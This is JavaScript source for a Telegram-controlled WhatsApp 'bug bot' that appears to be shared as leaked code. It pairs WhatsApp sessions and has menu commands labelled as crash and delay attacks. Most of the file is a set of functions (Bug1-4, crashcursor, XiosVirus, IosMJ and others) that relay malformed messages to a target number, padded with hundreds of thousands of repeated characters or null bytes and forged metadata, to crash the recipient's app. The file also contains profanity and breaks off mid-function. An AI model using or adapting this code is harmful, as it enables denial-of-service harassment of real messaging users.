//dari channel egi:
//sumber bocoran 
https://whatsapp.com/channel/0029VanLvXTHwXb4iPlCnS1c

const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");


function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const cooldowns = new Map();
const COOLDOWN_TIME = 80 * 1000; // 60 detik
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `╭─────────────────
│    *MEMULAI*    
│────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╭─────────────────
│    *RECONNECTING*    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `╭─────────────────
│    *KONEKSI GAGAL*    
│────────────────
│ Bot: ${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╭─────────────────
│    *TERHUBUNG*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `╭─────────────────
│    *KODE PAIRING*    
│────────────────
│ Bot: ${botNumber}
│ Kode: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Pesan: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

  console.log(`mengecek data di github...
mengecek data di github berhasil silahkan lanjut`);

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const waktuRunPanel = getUptime(); // Waktu uptime panel

  // Kirim pesan dengan foto dan tombol channel
  bot.sendVideo(chatId, "https://files.catbox.moe/loffrd.jpg", {
    caption: `╭━━━⊱    𝐕𝚯𝐈𝐃 𝐒𝐓𝐎𝐑𝐌   ━━━━━❍
┃▢ Developer : Zephyrine
┃▢ Version : 10.0 GlX
┃▢ Language : JavaScript
╰━━━━━━━━━━━━━━━━━❍    
╭━[🎭] Galaxy Techniques
┃▢ /plague - delay force
┃▢ /voidglx - infinities delay
┃▢ /overbuss - bussiness crash
╰━━━━━━━━━━━━━━━━━❍    
╭━[🦠] Cursed Techniques
┃▢ /overcursor - crash msg
┃▢ /curse - invisible home
╰━━━━━━━━━━━━━━━━━❍    
╭━[🖥️] Shikigami Control
┃▢ /addtoken
┃▢ /addreseller
┃▢ /addprem
┃▢ /delprem
┃▢ /reqpair
╰━━━━━━━━━━━━━━━━━❍    
╭━━━⊱ 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎
┃▢ Zephyrine - The Dev
┃▢ Anos Voldigoad - Partner
┃▢ Xatanical - Partner
┃▢ Darkness - Partner
┃▢ Trixsz - Partner
┃▢ Ecv-Blood - Partner
┃▢ Evil - Partner
╰━━━━━━━━━━━━━━━━━❍`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "「THE DEV」", url: "t.me/rainoneday" }],
        [
        { text: "「CHANNEL」", url: "https://t.me/rainonetime" },
        ],
      ],
    },
  });
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Kirim pesan dengan foto dan tombol channel
  bot.sendVideo(chatId, "https://files.catbox.moe/hr42x0.mp4", {
    caption: `SYANG NYA INI BUKAN COMMAND UTAMA COMMAND UTAMA ADALAH ADALAH /zep`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "ZEHPYH", url: "t.me/Zehpyh" }],
        [
        { text: "M Y C H", url: "https://t.me/+8YVwFxnN7tQ4NGY9" },
        ],
      ],
    },
  });
});

// [ BUG FUNCTION ]
async function crashcursor(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: cay.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© 𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! 𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢ - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `- Caywzz 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : Caywzz "
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await cay.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}

async function PayMent(sock, target) {
			var messageContent = generateWAMessageFromContent(target, ({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			sock.relayMessage(target, {
				'messageId': messageContent.key.id
			});
		}
		
async function XiosVirus(sock, target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    
async function PIRGO(sock, target) {
			var etc = generateWAMessageFromContent(target, ({
				interactiveMessage: {
					header: {
						title: "SUPER APHO😹",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://files.catbox.moe/24eeyb.jpg"
							}
						}, {
							upload: sock.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "›SUPERTEGAR NIS!!"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: target,
				quoted: QUOTED
			});
			await sock.relayMessage(target, {
				participant: { jid: target } }, { messageId: etc.key.id });
		}
		
async function Bug1(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢ "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𐎟 𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢ 𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - " MK4" 🥶',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

//NON CLICK
async function Bug2(sock, jid) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: "p bang",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      participant: { jid: jid },
    });
  } catch (err) {
    console.log(err);
  }
}

async function Bug4(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: 'woal ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

async function Bug3(sock, jid) {
  let target = jid;
  let msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢",
              hasMediaAttachment: false,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid: jid },
  });
}
    
    async function IosMJ(sock, jid) {
      await sock.relayMessage(
        jid,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: jid,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
